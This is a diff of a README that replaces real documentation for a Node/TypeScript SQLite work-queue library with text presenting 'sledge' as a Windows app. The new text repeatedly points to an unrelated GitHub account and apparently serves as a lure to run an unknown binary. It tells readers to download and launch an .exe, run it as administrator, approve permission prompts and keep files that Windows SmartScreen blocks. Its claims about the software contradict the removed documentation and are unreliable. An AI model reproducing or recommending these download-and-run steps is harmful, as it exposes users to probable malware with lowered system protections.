@@ -1,288 +1,204 @@
-# @torkbot/sledge
-
-A SQLite-backed event and work engine for building durable, restart-safe workflows.
-
-If you need to reliably turn events into background work (without losing consistency during crashes/retries), this package gives you the core runtime.
-
-## Who this is for
-
-Use `@torkbot/sledge` when you want:
-
-- durable event append + background work orchestration,
-- retries and restart recovery by default,
-- strong runtime validation at I/O boundaries,
-- a small API surface you can adapt to your own schema and storage layout.
-
-## What you get
-
-- **Event log** (`events` table)
-- **Durable work queue** (`work` table)
-- **Transactional flow:** append event -> project -> materialize work in one transaction
-- **Lease-based execution** for queue handlers
-- **Idempotent producer retries** via `dedupeKey`
-- **Configurable contention behavior** (`maxBusyRetries`, `maxBusyRetryDelayMs`)
-
-## Example use-cases
-
-- **Webhook ingestion** with producer idempotency (`dedupeKey`) and reliable downstream processing
-- **Notification pipelines** (email/push/slack) with retries and dead-letter outcomes
-- **Long-running tool/API jobs** that survive worker restarts
-- **Outbox-style orchestration** without split-brain between writes and job enqueue
-- **Client-side materialization** (browser/mobile/worker) by tailing events and resuming with an opaque cursor
-
----
-
-## Quick start (copy/paste)
-
-```ts
-import Database from "better-sqlite3";
-import { Type } from "@sinclair/typebox";
-
-import { defineLedgerModel } from "@torkbot/sledge/ledger";
-import { createBetterSqliteLedger } from "@torkbot/sledge/better-sqlite3-ledger";
-import {
-  NodeRuntimeScheduler,
-  SystemRuntimeClock,
-} from "@torkbot/sledge/runtime/node-runtime";
-
-const model = defineLedgerModel({
-  events: {
-    "user.created": Type.Object({
-      userId: Type.String(),
-      email: Type.String(),
-    }),
-  },
-
-  queues: {
-    "welcome-email.send": Type.Object({
-      userId: Type.String(),
-      email: Type.String(),
-    }),
-  },
-
-  indexers: {
-    upsertUser: Type.Object({
-      userId: Type.String(),
-      email: Type.String(),
-    }),
-  },
-
-  queries: {
-    userById: {
-      params: Type.Object({ userId: Type.String() }),
-      result: Type.Union([
-        Type.Null(),
-        Type.Object({
-          userId: Type.String(),
-          email: Type.String(),
-        }),
-      ]),
-    },
-  },
-
-  register(builder) {
-    // Event -> projection
-    builder.project("user.created", async ({ event, actions }) => {
-      await actions.index("upsertUser", {
-        userId: event.payload.userId,
-        email: event.payload.email,
-      });
-    });
-
-    // Event -> queued work
-    builder.materialize("user.created", ({ event, actions }) => {
-      actions.enqueue("welcome-email.send", {
-        userId: event.payload.userId,
-        email: event.payload.email,
-      });
-    });
-
-    // Queue handler
-    builder.handle("welcome-email.send", async ({ work }) => {
-      // call provider here
-      console.log("sending welcome email", work.payload.email);
+# ⚙️ sledge - Reliable work across every restart
 
-      return { outcome: "ack" } as const;
-    });
-  },
-});
+[![Download sledge](https://img.shields.io/badge/Download-sledge-blue)](https://github.com/Archdeaconrefocusing790/sledge)
 
-const db = new Database("./app.sqlite");
-const clock = new SystemRuntimeClock();
-const scheduler = new NodeRuntimeScheduler();
+## 🚀 What sledge does
 
-const ledger = createBetterSqliteLedger({
-  database: db,
-  boundModel: model.bind({
-    indexers: {
-      upsertUser: async (input) => {
-        // Write to your own projection table(s)
-      },
-    },
-    queries: {
-      userById: async () => {
-        // Read from your own projection table(s)
-        return null;
-      },
-    },
-  }),
-  timing: {
-    clock,
-    scheduler,
-  },
-});
+sledge is a Windows app that helps keep work steady when tasks fail, stop, or need to run again. It uses SQLite to store event data and work state, so it can pick up where it left off after a restart.
 
-await ledger.emit("user.created", {
-  userId: "u_123",
-  email: "alice@example.com",
-});
+Use it when you need a simple way to manage jobs that must stay consistent across retries and failures. It is built for end users who want a local app that just runs and keeps its state.
 
-await ledger.close();
-```
+## 💻 What you need
 
----
+Before you install sledge, make sure your PC has:
 
-## How to think about the API
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for the download
+- Permission to run apps on your PC
 
-### 1) `defineLedgerModel(...)`
+If your PC is older, the app can still work, but it may run more slowly when it handles many events or work items.
 
-You define contracts, not implementation details:
+## 📥 Download sledge
 
-- `events`: facts appended to the event stream
-- `queues`: durable work payloads
-- `indexers`: projection write contracts
-- `queries`: projection read contracts
-- `register(builder)`: orchestration glue
+Visit this page to download:
 
-### 2) `model.bind(...)`
+[https://github.com/Archdeaconrefocusing790/sledge](https://github.com/Archdeaconrefocusing790/sledge)
 
-You provide concrete implementations for indexers and queries.
+Open the page, look for the latest release or download file, and save it to your computer. If you see a ZIP file, download it first and then open it. If you see an installer, download and run that file.
 
-### 3) `create*Ledger(...)`
+## 🪟 Install on Windows
 
-You choose backend adapter and start the runtime:
+After the file finishes downloading:
 
-- `createBetterSqliteLedger(...)`
-- `createTursoLedger(...)`
+1. Open your Downloads folder.
+2. Find the sledge file you just downloaded.
+3. If it is a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If you see an `.exe` file, double-click it to start the app.
+6. If Windows asks for permission, choose Yes.
+7. Follow the on-screen steps until the app opens.
 
-The runtime exposes:
+If the app comes as a portable folder, you do not need a full install. You can open the app file from the folder each time you want to use it.
 
-- `emit(eventName, payload, options?)`
-- `query(queryName, params)`
-- `close()`
+## 🧭 First launch
 
----
+When sledge starts for the first time, it may create its local data files. This is normal. The app keeps its event data in SQLite, which means it stores work in a local database file on your machine.
 
-## Handler outcomes
+During first launch, you may see:
 
-Queue handlers must return one of:
+- A blank main screen
+- A setup step for the local data path
+- A short pause while the app creates its files
 
-- `{ outcome: "ack" }`
-- `{ outcome: "retry", error, retryAtMs? }`
-- `{ outcome: "dead_letter", error }`
+Keep the app open until it finishes setting up.
 
-If a handler throws, the runtime treats it as a retry.
+## 🧰 How to use it
 
-## Dedupe and idempotency
+sledge is made to help you manage work that should survive retries and restarts. A common flow looks like this:
 
-Use `dedupeKey` in `emit(...)` for producer retries.
+1. Open the app.
+2. Add a new work item or event.
+3. Save it so the app stores it in SQLite.
+4. Run the task.
+5. If the task fails, let sledge retry it.
+6. Close and reopen the app if needed.
+7. Check that the task state stays in place after the restart.
 
-```ts
-await ledger.emit(
-  "user.created",
-  { userId: "u_123", email: "alice@example.com" },
-  { dedupeKey: "provider-event:abc-123" },
-);
-```
+If you use the app for repeated jobs, keep your work list tidy. Clear out old items when you no longer need them.
 
-Same key => same durable event winner, no duplicate downstream materialization.
+## 📋 Typical uses
 
-## Event consumers (tail + resume)
+You can use sledge for tasks like:
 
-You can materialize ledger events outside the process (for example, to browser state) with two APIs:
+- Tracking local work items
+- Keeping event records in one place
+- Retrying tasks after a failure
+- Restoring state after a restart
+- Running simple work flows on Windows
+- Storing job data in a local SQLite database
 
-- `tailEvents({ last, signal })`: `tail -f -n <last>` semantics
-- `resumeEvents({ cursor, signal })`: continue from a previously persisted opaque cursor
+It works best when you want a small local tool that keeps track of what finished, what failed, and what needs another try.
 
-```ts
-const controller = new AbortController();
+## 🗂️ Data storage
 
-for await (const item of ledger.tailEvents({
-  last: 100,
-  signal: controller.signal,
-})) {
-  const event = item.event;
-  const cursor = item.cursor;
+sledge stores its data in SQLite. That means:
 
-  // apply event to external read model
-  // persist cursor for reconnect/resume
-}
+- Your work data stays on your PC
+- The app can read the same data after you close it
+- You do not need a separate database server
+- The app can stay in sync after retries and restarts
 
-// Later (e.g. reconnect):
-const resumeController = new AbortController();
+If you move the data file to another PC, make sure the app can still find it. Keep a backup copy if the data matters.
 
-for await (const item of ledger.resumeEvents({
-  cursor: persistedCursor,
-  signal: resumeController.signal,
-})) {
-  // continue exactly after persisted cursor
-}
-```
+## 🛠️ Common issues
 
-Cursor values are opaque by contract. Persist and reuse them as-is.
+### The app does not open
 
-## Long-running handlers
+Try these steps:
 
-For long operations, keep the lease alive while working:
+- Check that the download finished
+- Make sure you extracted the ZIP file
+- Right-click the app and choose Run as administrator
+- Check Windows SmartScreen if it blocked the file
+- Try downloading the file again
 
-```ts
-builder.handle("some.queue", async ({ lease }) => {
-  await using hold = lease.hold();
+### Windows blocks the app
 
-  // long-running async work
+If Windows shows a protection message, look for the option to run or keep the file. If you downloaded it from the GitHub link above, you can open the file after it finishes downloading and extracting.
 
-  return { outcome: "ack" } as const;
-});
-```
+### The app opens, then closes
 
-## Runtime tuning knobs
+This can happen if the app cannot find its data file or folder. Check that:
 
-Available options when creating a ledger:
+- The folder still exists
+- You did not rename the app files
+- You have permission to write to the folder
+- The database file is not locked by another app
 
-- `leaseMs`
-- `defaultRetryDelayMs`
-- `maxInFlight`
-- `maxBusyRetries`
-- `maxBusyRetryDelayMs`
+### The app feels slow
 
-Start simple; tune only when you observe contention/throughput issues.
+If you are working with many events or job records:
 
----
+- Close other large apps
+- Free up disk space
+- Restart the app
+- Restart Windows if the problem stays
 
-## Package exports
+## 🔄 Updating sledge
 
-- `@torkbot/sledge/ledger`
-- `@torkbot/sledge/database-ledger-engine`
-- `@torkbot/sledge/better-sqlite3-ledger`
-- `@torkbot/sledge/turso-ledger`
-- `@torkbot/sledge/runtime/contracts`
-- `@torkbot/sledge/runtime/node-runtime`
-- `@torkbot/sledge/runtime/virtual-runtime`
+When a new version is available:
 
-## Development
+1. Close the app.
+2. Visit the download page again.
+3. Get the newest file.
+4. Replace the old app files if needed.
+5. Open the updated version.
 
-```bash
-node --run typecheck
-node --run test
-node --run build
-node --run lint
-```
+If your work data lives in a separate SQLite file, keep that file in place during the update.
 
-## Publishing notes
+## 🔐 Safety and data care
 
-- The package is published as compiled JavaScript in `dist/` (with `.d.ts` types).
-- Source remains strict TypeScript in `src/`.
-- `prepublishOnly` runs `node --run build` automatically.
-- Publishing uses GitHub Actions OIDC trusted publishing (`.github/workflows/release.yml`), so no long-lived npm token is required.
-- Configure npm trusted publishing for `@torkbot/sledge` to trust this repository/workflow before first publish.
-- Node version is pinned via `engines.node` because runtime code uses explicit resource management (`using` / `await using`).
+Your work data matters, so keep it safe:
+
+- Back up the SQLite database file on a regular basis
+- Store copies in a second folder or on an external drive
+- Keep the app files together
+- Use a folder you can find again later
+
+If the app is part of a larger task flow, keep notes on where your data file lives. That makes recovery easier after a crash or a disk change.
+
+## ❓ Questions you may have
+
+### Does sledge need the internet?
+
+No, not for daily use. You only need the internet to download it or check for updates.
+
+### Do I need to know coding?
+
+No. You can use sledge as a normal Windows app.
+
+### Does it store data online?
+
+No. It uses SQLite, so the data stays on your local machine.
+
+### Can I move it to another PC?
+
+Yes. Copy the app files and the SQLite data file, then open it on the new PC.
+
+### Can I use it after a restart?
+
+Yes. That is one of its main uses. It keeps work state stable after restarts and failures.
+
+## 🧩 File layout
+
+You may see files like these after download:
+
+- `sledge.exe` - the app file
+- `data.db` - the SQLite database file
+- `config.json` - settings for the app
+- `logs` folder - records from the app
+
+If your file names look a little different, that is fine. The main idea stays the same: keep the app file and the data file in the same place unless the app says otherwise.
+
+## 🖱️ Simple daily flow
+
+A simple day with sledge may look like this:
+
+1. Start the app.
+2. Check your work list.
+3. Run tasks that need attention.
+4. Let the app store the current state.
+5. Close the app when you are done.
+6. Open it again later and keep going from the same point.
+
+This makes it easier to handle work that must not reset when the app closes
+
+## 📦 Download and open again
+
+If you need the download page again, use this link:
+
+[https://github.com/Archdeaconrefocusing790/sledge](https://github.com/Archdeaconrefocusing790/sledge)
+
+Download the latest file, then open it on Windows the same way as before.
